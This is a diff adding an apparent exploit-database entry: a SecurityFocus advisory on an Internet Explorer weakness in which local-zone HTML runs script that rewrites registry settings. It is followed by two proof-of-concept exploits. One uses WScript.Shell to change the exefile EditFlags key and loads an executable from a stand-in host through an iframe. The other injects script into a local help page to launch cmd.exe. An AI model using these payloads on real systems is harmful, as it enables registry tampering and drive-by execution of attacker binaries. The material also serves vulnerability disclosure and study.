@@ -1,0 +1,41 @@
+source: http://www.securityfocus.com/bid/10652/info
+
+Microsoft Internet Explorer is reported prone to a security weakness that may permit malicious HTML documents the ability to execute script code. This script code has the ability to alter registry settings that may allow for further attacks. In conjunction with other vulnerabilities, execution of attacker-supplied binaries may also be possible.
+
+In particular, it is reported possible to alter the registry to allow for previously patched vulnerabilities to be exploitable again.
+
+Exploitation of this weakness typically requires other vulnerabilities to redirect the browser into the Local Zone (or other appropriate Security Zone). Other attack vectors also exist, such as enticing a user to download an HTML document to their system then opening it with the Web browser. HTML email may also provide an attack vector for this weakness (in combination with other vulnerabilities). Cross-site scripting and HTML injection vulnerabilities in Web applications may also provide a surreptitious attack vector in unsuspecting clients. 
+
+"Matthew Murphy" <mattmurphy@kc.rr.com> proposed:
+<html><head>
+<script language="JavaScript" defer>
+function throw_onload() {
+actx.RegWrite("HKCR\\exefile\\EditFlags", 0x38070000, "REG_BINARY");
+window.close();
+}
+var actx = new ActiveXObject("WScript.Shell");
+actx.RegWrite("HKCR\\exefile\\EditFlags", 256, "REG_BINARY");
+document.writeln("<IFRAME SRC=\"http://www.somebadsite.com/file.exe\"
+ONLOAD=\"throw_onload()\" />");
+window.setTimeout("throw_onload()", 5000); // Don't know for sure if IE
+fires OnLoad for .exe files! Anyone?
+</script></head><body></body></html>
+
+"http-equiv@excite.com" <1@malware.com> presented:
+<iframe src="shell:windows\web\tip.htm"
+style="width:400px;height:200px;"></iframe>
+<textarea id="code" style="display:none;">
+injected.
+<script language="JScript" DEFER>
+alert('attempting injection');
+var obj=new ActiveXObject("Shell.Application");
+obj.ShellExecute("cmd.exe","/c pause");
+</script>
+&lt;/textarea&gt;
+<script language="javascript">
+function doit() {
+document.frames[0].document.body.insertAdjacentHTML('afterBegin',
+document.all.code.value);
+}
+setTimeout("doit()", 2000);
+</script> 
